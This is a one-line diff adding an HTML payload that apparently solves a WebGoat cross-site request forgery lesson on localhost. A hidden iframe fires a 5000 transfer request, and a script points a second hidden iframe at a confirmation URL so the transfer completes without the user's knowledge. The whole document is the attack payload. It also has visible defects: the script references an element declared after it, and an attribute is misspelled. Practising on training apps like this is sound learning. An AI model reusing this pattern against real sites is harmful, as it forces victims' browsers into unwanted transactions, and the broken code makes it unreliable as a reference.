@@ -1,0 +1,1 @@
+<iframe id="img1" src="http://localhost:8090/WebGoat/attack?Screen=2094584595&menu=900&transfer=5000" width="20" height="20"></iframe><script>document.getElementById("img2").setAttribute("src", "http://localhost:8090/WebGoat/attack?transfer=CONFIRMED#attack/2094584595/900")</script><iframe id="img2" src="" widht="20" height="20"></iframe>
